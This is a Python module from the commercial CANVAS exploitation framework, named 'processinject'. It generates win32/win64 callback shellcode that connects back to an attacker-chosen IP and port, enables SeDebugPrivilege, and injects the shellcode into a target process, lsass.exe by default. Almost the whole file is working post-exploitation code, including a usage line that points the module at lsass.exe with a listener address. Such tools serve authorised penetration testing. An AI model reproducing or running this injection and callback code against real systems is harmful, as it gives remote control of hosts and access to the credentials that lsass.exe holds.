#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import time
import canvasengine
from exploitutils import *
from canvasexploit import canvasexploit
from canvasengine import socket_save_list
from shellcode.standalone.windows import payloads64
from ExploitTypes.localcommand import LocalCommand

NAME                                 = "processinject"
DESCRIPTION                          = "Injects a callback shellcode into a process"
DOCUMENTATION                        = {}
DOCUMENTATION["Notes"]               = "Automatically enables SeDebugPrivilege if needed"
DOCUMENTATION["Commandline Example"] = "runmodule processinject -t 1 -l 192.168.1.102 -d 5555 -O name:lsass.exe"
VERSION                              = "1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result    = ""
        self.name      = NAME
        self.pidorname = "lsass.exe"

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.pidorname = self.argsDict.get("name", self.pidorname)

    def run(self):
        #you'll need to use the -i fromcreatethread option for commandlineInterface.py
        #might want: runmodule getpriv -t 1 -O privname:SeDebugPrivilege
        #example: runmodule processinject -t 1 -l 192.168.1.102 -d 5555 -O name:lsass.exe

        self.setInfo("%s (in progress)" % NAME)
        self.getargs()
        self.node = self.argsDict["passednodes"][0]
        name = self.pidorname

        nodetype = self.node.nodetype

        if nodetype not in ("win32Node", "win64Node"):
            self.log("Process injection not support for node %s" % nodetype)
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        host = self.callback.ip
        port = self.callback.port

        if nodetype == "win32Node":
            self.log("Creating win32 shellcode to callback to %s:%s" % (host,port))

            from shellcode import shellcodeGenerator
            sc = shellcodeGenerator.win32()
            sc.vProtectSelf = True
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe", None) #MOSDEF
            sc.addAttr("ExitThread", {"closesocket":True})
            self.shellcode = sc.get()
        elif nodetype == "win64Node":
            self.log("Creating win64 shellcode to callback to %s:%s" % (host,port))
            p = payloads64.payloads()
            asm = p.callback(host, port, universal=True, close_socket=True)
            bin = p.assemble(asm)
            self.shellcode = bin


        # we may need to hunt down the pid from the name
        pid = self.pidfromname(name, self.node)
        if pid == -1:
            self.log("Was not able to get the pid for %s" % name)
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        self.log("Getting SeDebugPrivilege if necessary")
        self.exploitnodes("getpriv", [self.node], {"privname":"SeDebugPrivilege"})

        if self.node.shell.has_wow_64:
            # Try and cover all cases
            try:
                target_is_wow64 = self.node.shell.IsWow64Process(pid)
            except Exception, ex:
                self.setInfo("processinject - (done) - could not OpenProcess")
                return 0

            if nodetype == "win64Node" and target_is_wow64:
                self.log('Can not inject from win64Node to 32bit process, aborting..')
                self.setInfo('processinject - (done) - did not run on this node')
                return 0

            if nodetype == "win32Node" and self.node.shell.IsWow64Process() and not target_is_wow64:
                self.log('Can not inject from win32Node to a 64bit process, aborting')
                self.setInfo('processinject - (done) - did not run on this node')
                return 0

        self.log("Injecting into pid %d" % pid)
        self.log("Injecting a shellcode of length %d" % len(self.shellcode))

        self.node.shell.injectintopid(pid, self.shellcode)

        self.setInfo("%s - done (success)" % NAME)
        self.ISucceeded()
        return 1

